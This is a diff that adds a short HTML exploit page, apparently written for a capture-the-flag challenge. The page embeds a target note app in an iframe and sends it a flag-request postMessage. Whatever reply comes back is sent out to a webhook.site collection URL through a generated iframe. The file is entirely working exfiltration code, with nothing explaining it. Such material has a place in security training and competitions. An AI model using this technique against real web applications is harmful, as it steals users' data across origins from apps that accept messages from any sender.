@@ -1,0 +1,19 @@
+<html>
+    <head>
+        <title>CyberTaskForce Zero</title>
+        <script>
+            function start_attack() {
+                window.addEventListener("message", (event) => {
+                    let iframe = document.createElement("iframe");
+                    iframe.src = "https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/" + encodeURIComponent(event.data);
+                    document.body.appendChild(iframe);
+                });
+                let target = document.getElementById("target");
+                target.contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "*");
+            }
+        </script>
+    </head>
+    <body>
+        <iframe id="target" src="http://chall1.jsapi.tech/?enableapi=true&recv=ctf0.chall1.jsapi.tech" onload="start_attack"></iframe>
+    </body>
+</html>
